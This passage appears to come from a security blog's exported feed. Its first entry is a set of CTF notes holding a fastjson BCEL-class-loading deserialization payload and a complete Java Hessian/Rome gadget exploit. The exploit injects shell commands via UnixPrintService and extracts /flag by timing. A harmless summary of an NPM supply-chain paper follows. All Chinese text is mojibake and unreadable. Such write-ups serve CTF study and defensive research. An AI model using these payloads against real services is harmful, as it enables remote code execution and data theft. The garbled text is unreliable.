Utility.encode( buf, true );</span><br><span class="line">        String  bcel        = &quot;$$BCEL$$&quot; + str;</span><br><span class="line">        System.out.println( bcel );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SpringEcho.java </span><br><span class="line">å‚è€ƒhttps://github.com/depycode/fastjson-local-echo</span><br><span class="line"></span><br><span class="line">å¤§æ¦‚é•¿è¿™æ ·ï¼Œ BCELæ›¿æ¢ä¸‹å°±è¡Œ</span><br><span class="line">Payload:&#123;&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;a&quot;:&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;&#125;&#125;:&quot;b&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="FInalUnser"><a href="#FInalUnser" class="headerlink" title="FInalUnser"></a>FInalUnser</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> marshalsec;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> marshalsec.gadgets.JDKUtil;</span><br><span class="line"><span class="keyword">import</span> sun.print.UnixPrintService;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String dict = <span class="string">&quot;&#125;abcdefghijklmnopqrstuvwxyz0123456789-&quot;</span>;</span><br><span class="line">        String addstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> pos=<span class="number">8</span>; pos &lt; <span class="number">50</span>; pos++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ç¬¬&quot;</span>+pos+<span class="string">&quot;ä½ï¼š &quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dict.length(); i++) &#123;</span><br><span class="line">                String finalPayload = <span class="string">&quot;;if [ `cut -c 1-&quot;</span>+pos+<span class="string">&quot; /flag` = \&quot;scuctf&#123;&quot;</span>+ addstr + dict.charAt(i) + <span class="string">&quot;\&quot; ];then sleep 2;fi&quot;</span>;</span><br><span class="line">                System.out.println(finalPayload);</span><br><span class="line">                Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);</span><br><span class="line">                declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ObjectBean delegate = <span class="keyword">new</span> ObjectBean(UnixPrintService.class, declaredConstructor.newInstance(finalPayload));</span><br><span class="line">                ObjectBean root = <span class="keyword">new</span> ObjectBean(ObjectBean.class, delegate);</span><br><span class="line">                HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);</span><br><span class="line">                ByteArrayOutputStream os = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                Hessian2Output output = <span class="keyword">new</span> Hessian2Output(os);</span><br><span class="line">                HessianBase.NoWriteReplaceSerializerFactory sf = <span class="keyword">new</span> HessianBase.NoWriteReplaceSerializerFactory();</span><br><span class="line">                sf.setAllowNonSerializable(<span class="keyword">true</span>);</span><br><span class="line">                output.setSerializerFactory(sf);</span><br><span class="line">                output.writeObject(map);</span><br><span class="line">                output.getBytesOutputStream().flush();</span><br><span class="line">                output.completeMessage();</span><br><span class="line">                output.close();</span><br><span class="line">                String payload = <span class="keyword">new</span> String(Base64.getEncoder().encode(os.toByteArray()));</span><br><span class="line">                Test http = <span class="keyword">new</span> Test();</span><br><span class="line">                <span class="keyword">boolean</span> res = http.doPost(<span class="string">&quot;http://*.*.*.*:1235/&quot;</span>, payload, String.valueOf(dict.charAt(i)));</span><br><span class="line">                <span class="keyword">if</span> (!res) &#123;</span><br><span class="line">                    addstr = addstr + dict.charAt(i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doPost</span><span class="params">(String URL, String payload, String flag)</span> </span>&#123;</span><br><span class="line">        OutputStreamWriter out = <span class="keyword">null</span>;</span><br><span class="line">        BufferedReader in = <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        HttpURLConnection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            URL url = <span class="keyword">new</span> URL(URL);</span><br><span class="line">            conn = (HttpURLConnection) url.openConnection();</span><br><span class="line">            conn.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">            <span class="comment">//å‘é€POSTè¯·æ±‚å¿…é¡»è®¾ç½®ä¸ºtrue</span></span><br><span class="line">            conn.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">            conn.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//è®¾ç½®è¿æ¥è¶…æ—¶æ—¶é—´å’Œè¯»å–è¶…æ—¶æ—¶é—´ï¼Œæ”¾çŸ­æ–¹ä¾¿å‡ºé”™</span></span><br><span class="line">            conn.setConnectTimeout(<span class="number">1000</span>);</span><br><span class="line">            conn.setReadTimeout(<span class="number">1000</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            <span class="comment">//è·å–è¾“å‡ºæµ</span></span><br><span class="line">            out = <span class="keyword">new</span> OutputStreamWriter(conn.getOutputStream());</span><br><span class="line">            out.write(<span class="string">&quot;payload=&quot;</span>+payload);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">            <span class="comment">//å–å¾—è¾“å…¥æµï¼Œå¹¶ä½¿ç”¨Readerè¯»å–</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">200</span> == conn.getResponseCode()) &#123;</span><br><span class="line">                in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(conn.getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    result.append(line);</span><br><span class="line"><span class="comment">//                    System.out.println(line);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;ResponseCode is an error code:&quot;</span> + conn.getResponseCode());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line">            System.out.println(flag);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (out != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    in.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">                ioe.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Are Software Dependency Supply Chain Metrics Useful in Predicting Change of Popularity of NPM Packages?</title>
      <link href="/2022/03/09/Are%20Software%20Dependency%20Supply%20Chain%20Metrics%20Useful%20in%20Predicting%20Change%20of%20Popularity%20of%20NPM%20Packages/"/>
      <url>/2022/03/09/Are%20Software%20Dependency%20Supply%20Chain%20Metrics%20Useful%20in%20Predicting%20Change%20of%20Popularity%20of%20NPM%20Packages/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šT Dey, A Mockus</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šAre Software Dependency Supply Chain Metrics Useful in Predicting Change of Popularity of NPM Packages?</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://dl.acm.org/doi/abs/10.1145/3273934.3273942">https://dl.acm.org/doi/abs/10.1145/3273934.3273942</a></em></p><p><em>åŸæ–‡æ¥æºï¼šPROMISE&#39;18</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>ä¸€ä¸ªè½¯ä»¶æ˜¯å¦æœ‰ç”¨ã€æ˜¯å¦å—åˆ°å¤§ä¼—å–œçˆ±å’Œè¿½æ§ï¼Œå–å†³äºå…¶ä½¿ç”¨ç‡ï¼Œè€Œå…¶æµè¡Œç¨‹åº¦éœ€è¦æ ¹æ®å…¶æ´»è·ƒç”¨æˆ·æ•°é‡æ¥è¡¡é‡ã€‚ä½†é™¤éè¿™äº›è½¯ä»¶å°è¯•è¿½è¸ªå¹¶è¯„ä¼°å…¶ç”¨æˆ·æ´»è·ƒåº¦ï¼Œå¦åˆ™è¿™äº›æ´»è·ƒç”¨æˆ·æ•°é‡æ˜¯éš¾ä»¥ç›´æ¥å‡†ç¡®åœ°ç»Ÿè®¡çš„ã€‚é™¤äº†è€ƒè™‘æ´»è·ƒç”¨æˆ·æ•°é‡ä»¥å¤–è¿˜æœ‰æ²¡æœ‰èƒ½ç”¨äºè¡¡é‡è½¯ä»¶æµè¡Œç¨‹åº¦çš„å‘¢ï¼Ÿä¸‹è½½é‡ä¹Ÿè®¸æ˜¯ä¸€ä¸ªä¸é”™çš„ç­”æ¡ˆï¼Œä¹Ÿæ˜¯æœ€æ¥è¿‘è½¯ä»¶å—æ¬¢è¿ç¨‹åº¦å†…æ¶µçš„ä¸€ä¸ªæ•°æ®ã€‚  </p><p>ä½œè€…å…³æ³¨åˆ°NPMåˆ†å‘çš„JavaScriptåŒ…å­˜åœ¨ç€æ¯”è¾ƒå¤æ‚çš„ä¾èµ–å…³ç³»ï¼Œå³ä¸€ä¸ªåŒ…å¯èƒ½æ˜¯å…¶ä»–åŒ…è¿è¡Œæ—¶æˆ–å¼€å‘æ—¶çš„ä¾èµ–ã€‚è¿™ç§ä¾èµ–å…³ç³»ç½‘ç»œä¼šå½±å“åˆ°å•ä¸ªè½¯ä»¶åŒ…çš„ä¸‹è½½æ•°é‡ï¼Œå½“ç”¨æˆ·å®‰è£…ä¸€ä¸ªè½¯ä»¶åŒ…çš„æ—¶å€™ï¼Œä¼šåŒæ—¶å®‰è£…å…¶ä¾èµ–é¡¹ã€‚å› æ­¤åˆ†æä¸€ä¸ªä½“é‡è¶…è¿‡600Kçš„ç”Ÿæ€ç³»ç»Ÿä¸­è½¯ä»¶åŒ…çš„æµè¡Œç¨‹åº¦é¢ä¸´ç€å·¨å¤§çš„å›°éš¾ã€‚</p><p><strong>RQ: ä¸Šä¸‹æ¸¸ä¾èµ–é¡¹çš„ä¸‹è½½é‡æ˜¯å¦æœ‰åŠ©äºé¢„æµ‹NPMä¸­æµè¡Œçš„JavaScriptåŒ…çš„ä¸‹è½½é‡ï¼Ÿ</strong></p><h2 id="0x02-Data"><a href="#0x02-Data" class="headerlink" title="0x02 Data"></a>0x02 Data</h2><p>æ‰€æœ‰ç”¨äºç ”ç©¶çš„æ•°æ®å‡é‡‡è‡ªnpms.ioçš„APIï¼Œä½œè€…åªå…³æ³¨äº†é‚£äº›è‡³å°‘æœ‰ä¸€ä¸ªä¸Šæ¸¸ä¾èµ–å’Œä¸€ä¸ªä¸‹æ¸¸ä¾èµ–çš„åŒ…ï¼Œæœ€ç»ˆåœ¨60å¤šä¸‡ä¸ªåŒ…ä¸­ï¼Œæ‰¾å‡ºäº†72,211ä¸ªç¬¦åˆå…¶æ ‡å‡†çš„è½¯ä»¶åŒ…ã€‚æ•°æ®æ”¶é›†è¿‡ç¨‹æ¶µç›–äº†2017å¹´12æœˆ1æ—¥è‡³2018å¹´3æœˆ15æ—¥ä¹‹é—´çš„æ—¥æœŸï¼Œåˆ†åˆ«äºæœˆåˆå’Œæœˆä¸­æ”¶é›†è¿™éƒ¨åˆ†NPMè½¯ä»¶åŒ…çš„ä¿¡æ¯ï¼Œä»è€Œäº§ç”Ÿå¯¹åº”çš„è½¯ä»¶åŒ…å¿«ç…§ï¼Œå…±è®¡8ä¸ªå¯ç”¨å¿«ç…§ï¼ˆèƒ½å¤Ÿç”¨äºé¢„æµ‹å½“å‰å’Œä¸‹ä¸ªæœˆä¸‹è½½æ¯”ä¾‹çš„å¿«ç…§éœ€è¦æ’é™¤æœ€åä¸¤ä¸ªå¿«ç…§ï¼‰ã€‚</p><p>ä»npms.ioä¸Šæ”¶é›†çš„æ•°æ®åŒ…æ‹¬Githubä»“åº“ä¿¡æ¯ï¼Œè¿™å…¶ä¸­åˆæœ‰Issueæ•°ã€æ¯å‘¨/æœˆ/å­£åº¦/åŠå¹´/å¹´çš„æäº¤æ•°ã€è´¡çŒ®è€…åå•å’Œè´¡çŒ®è€…æäº¤æ•°ã€Branchæ•°å’ŒStaræ•°ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜é‡‡é›†åˆ°äº†è½¯ä»¶åŒ…çš„å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬è¿è¡Œæ—¶/å¼€å‘æ—¶çš„ä¾èµ–åˆ—è¡¨ã€æœˆåº¦/å­£åº¦/åŠå¹´åº¦/å¹´åº¦/æ€»è®¡å‘å¸ƒæ•°é‡ã€ä½œè€…å§“åé‚®ä»¶ã€READMEç­‰ç­‰ã€‚å¯¹äºä¸€äº›ç”±npms.ioè®¡ç®—çš„è¯„ä»·æŒ‡æ ‡ï¼Œä½œè€…å¹¶æ²¡æœ‰ä½¿ç”¨ã€‚è€Œå¯¹äºå‘å¸ƒå’Œæäº¤çš„æ•°é‡ï¼Œä½œè€…æ ¹æ®PCAåˆ†æåªç”¨äº†æ¯æœˆå’Œæ¯å¹´çš„æ•°å­—ã€‚</p><p>ä¸ºäº†ä¿æŒå‰åä¸€è‡´æ€§ï¼Œä½œè€…è€ƒè™‘åˆ°é€šå¸¸NPMå®‰è£…æŸä¸ªè½¯ä»¶åŒ…çš„æ—¶å€™ä¼šä¼˜å…ˆä½¿ç”¨æœ¬åœ°ç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™äº›å®‰è£…æ˜¯ä¸ä¼šè®¡å…¥è½¯ä»¶åŒ…çš„ä¸‹è½½é‡çš„ã€‚äºæ˜¯æ ¹æ®å»ºè®®â€œåªæœ‰å½“ä¸€ä¸ªNPMåŒ…çš„ä¸‹è½½é‡å¤§äº50æ¬¡/å¤©çš„æ—¶å€™ï¼Œæ‰è®¤ä¸ºæ˜¯å€¼å¾—çº³å…¥è€ƒè™‘èŒƒå›´çš„è½¯ä»¶åŒ…â€ä½œè€…è¿›ä¸€æ­¥è¿‡æ»¤å‡ºäº†12,999ä¸ªè½¯ä»¶åŒ…ã€‚</p><h2 id="0x03-Analysis"><a href="#0x03-Analysis" class="headerlink" title="0x03 Analysis"></a>0x03 Analysis</h2><p>ä½œè€…åˆ†ä¸¤æ­¥å¯¹æ‰€æœ‰æ•°æ®è¿›è¡Œäº†åˆ†æã€‚é¦–å…ˆå¯¹6ä¸ªå¿«ç…§ä¸­çš„æ¯ä¸€ä¸ªå¿«ç…§å•ç‹¬è¿›è¡Œçº¿æ€§å›å½’ï¼Œå¹¶æ¯”è¾ƒç»“æœã€‚åœ¨è¿™ä¸€æ­¥ä¸­åªåšæ¨¡å‹æ‹Ÿåˆï¼Œè€Œæ²¡æœ‰è¿›è¡Œé¢„æµ‹ã€‚ç¬¬äºŒéƒ¨ä½œè€…åˆå¹¶äº†6ä¸ªå¿«ç…§çš„æ•°æ®ï¼Œå¹¶é™„å¢ä¸€ä¸ªâ€œæ—¥æœŸâ€å˜é‡ä»¥è€ƒè™‘æ—¶é—´å› ç´ ï¼Œè¾“å…¥è‡³ä¸€ä¸ªéšæœºæ£®æ—æ¨¡å‹ä¸­è¿›è¡Œé¢„æµ‹ã€‚åŒæ—¶ï¼Œè°ƒç ”äº†ç‰¹å¾é‡è¦æ€§ï¼Œå¦‚ä¸‹å›¾ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b04c7726-07c2-4b87-815a-5951e3b91dbb.png"></p><p>å®éªŒç»“æœæ˜¾ç¤ºï¼Œå½“ä½¿ç”¨éšæœºæ£®æ—æ¨¡å‹ï¼ˆåŒ…å«æ‰€æœ‰å˜é‡ï¼‰æ¥é¢„æµ‹ä¸‹è½½é‡æ˜¯å¦ä¼šå¢åŠ æ—¶ï¼ŒROCæ›²çº¿ä¸‹AUC 0.73ï¼Œæ•æ„Ÿæ€§å’Œç‰¹å¼‚æ€§å€¼ä¸º0.66å’Œ0.56ã€‚è€Œå½“ä¸åŒ…å«è¿™äº›å¼•å…¥çš„å˜é‡æ—¶ï¼ŒROCæ›²çº¿ä¸‹AUCå€¼ã€æ•æ„Ÿæ€§å’Œç‰¹å¼‚æ€§å€¼ä¸º0.65ã€0.59å’Œ0.53ã€‚</p><h2 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h2><p>ä½œè€…æ—¨åœ¨é€šè¿‡è½¯ä»¶ä¾›åº”é“¾çš„è§†è§’æ›´å¥½åœ°ç†è§£è¿™äº›è½¯ä»¶ç”Ÿæ€ç³»ç»Ÿçš„è¡Œä¸ºï¼Œå¹¶æ¨¡æ‹Ÿè½¯ä»¶ä¾èµ–ç½‘ç»œçš„å½±å“å¦‚ä½•å½±å“JavaScriptè½¯ä»¶åŒ…çš„ä¸‹è½½å˜åŒ–ã€‚å…¶ä½¿ç”¨çº¿æ€§å›å½’å’Œéšæœºæ£®æ—æ¨¡å‹åˆ†æäº†2017å¹´12æœˆ1æ—¥è‡³2018å¹´3æœˆ15æ—¥æœŸé—´NPMä¸­çš„12,999ä¸ªæµè¡ŒåŒ…ï¼Œå¹¶ç ”ç©¶äº†ä»£è¡¨è½¯ä»¶ä¾èµ–æ€§ä¾›åº”é“¾ä¸åŒæ–¹é¢çš„é¢„æµ‹å› ç´ å¯¹åŒ…çš„ä¸‹è½½æ•°é‡å˜åŒ–çš„å½±å“ã€‚åˆæ­¥ç»“æœè¡¨æ˜ï¼Œä¸Šæ¸¸å’Œä¸‹æ¸¸è¿è¡Œæ—¶ä¾èµ–çš„æ•°é‡å’Œä¸‹è½½é‡å¯¹è¯¥è½¯ä»¶åŒ…ä¸‹è½½é‡çš„å˜åŒ–æœ‰å¾ˆå¤§çš„å½±å“ï¼Œä»¥æ›´å°‘ã€æ›´å—æ¬¢è¿çš„è½¯ä»¶åŒ…ä¸ºä¾èµ–ï¼ˆä¸Šæ¸¸æˆ–ä¸‹æ¸¸ï¼‰çš„è½¯ä»¶åŒ…çš„ä¸‹è½½é‡å¤§æ¦‚ç‡ä¼šç¼“æ­¥ä¸Šå‡ã€‚è¯»è€…åœ¨é˜…è¯»äº†è¿™ä»½ç ”ç©¶æŠ¥å‘Šåå‘ç°ä½œè€…åœ¨è€ƒè™‘çº³å…¥ç»Ÿè®¡çš„NPMåŒ…çš„æ—¶å€™å…¶å®å¹¶æœªå¯¹åŒ…çš„ç±»å‹ç¨ä½œåŒºåˆ†ï¼ˆçº¯æ„å»ºè½¯ä»¶åŒ…ã€å¤§å‹ç³»ç»Ÿçš„ç»„ä»¶è½¯ä»¶åŒ…ç­‰ï¼‰ï¼Œè¿™äº›ç±»å‹ä¹Ÿè®¸ä¼šå¯¹ä¾èµ–å…³ç³»ä»¥åŠåŒ…çš„æµè¡Œç¨‹åº¦è¯„ä¼°é—®é¢˜ä¸Šäº§ç”Ÿè¾ƒå¤§çš„å½±å“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NPM </tag>
            
            <tag> Supply Chain </tag>
            
            <tag> PROMISE&#39;18 </tag>
            
